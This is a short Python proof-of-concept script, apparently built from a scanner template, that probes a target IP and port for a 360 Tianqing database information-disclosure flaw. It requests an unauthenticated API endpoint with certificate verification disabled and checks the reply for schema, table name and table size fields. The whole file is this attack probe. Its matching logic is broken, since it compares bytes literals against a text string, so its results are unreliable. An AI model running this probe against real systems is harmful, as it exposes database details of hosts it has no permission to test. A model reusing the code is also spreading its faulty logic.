#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
    requests.packages.urllib3.disable_warnings()
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    try:
        payload = "/api/dbstat/gettablessize"                                                      #填写payload
        tar = "https://" + ip + ":" + port + payload
        ssl = requests.session()
        req = ssl.get(tar,timeout=3,verify=False)
        print(req.text)
        print(req.status_code)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"schema_name" in req.text ) and ( b"table_name" in req.text ) and ( b'table_size' in req.text):          #填写匹配信息
                logging.info("[+] {} find 360_Tianqing_database_information_disclosure".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info("[-] {} do not found 360_Tianqing_database_information_disclosure".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info("[-] {} do not found 360_Tianqing_database_information_disclosure".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
